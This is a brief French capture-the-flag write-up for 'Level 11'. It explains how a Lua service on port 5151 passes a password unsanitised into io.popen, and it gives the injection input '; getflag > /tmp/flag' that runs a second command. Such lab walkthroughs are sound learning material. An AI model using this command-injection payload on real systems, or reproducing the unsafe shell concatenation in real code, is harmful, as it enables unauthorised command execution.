# Level 11

---

- Nous avons cette fois ci un script lua qui ecoute sur le port 5151, nous lancons donc la commande suivante :

```bash
nc localhost 5151
```

- Le programme demande ensuite un mot de passe qui est ensuite utilise ainsi:
```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

- io.popen vas ouvrir et lancer une commande dans un terminal, on peut donc en abuser ainsi:
```bash
; getflag > /tmp/flag
```

- Il suffit simplement de lire ensuite le fichier ainsi genere.
